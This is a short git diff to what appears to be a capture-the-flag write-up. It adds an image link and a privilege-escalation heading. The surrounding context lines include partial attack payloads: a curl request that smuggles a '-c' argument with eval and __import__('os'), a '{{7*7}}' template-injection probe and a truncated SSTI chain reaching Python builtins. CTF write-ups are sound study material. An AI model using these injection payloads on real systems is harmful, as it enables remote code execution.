@@ -89,6 +89,9 @@ curl -G https://chall1.pxxl.xyz/run_file -d "code=-c%0aeval(\"__import__(\'os\')
 x: "{{7*7}}"
 ```
 
+![image](https://github.com/user-attachments/assets/e4fd1bf4-85f5-4ce6-bfb4-ed18a3112ce40)
+
+
 - Final payload-:
 
 ```
@@ -111,6 +114,13 @@ x: "{{config.__init__.__globals__.__getitem__('__BUILTINS__'.lower()).__getitem_
 -----------------
 
 - Vulnerability-: Php Insecure Deserialization(Privesc to Remote Code Execution)
+
+------------------
+
+### Source Code Analysis (Privilege Escalation)
+
+------------------
+
 - 
 
 
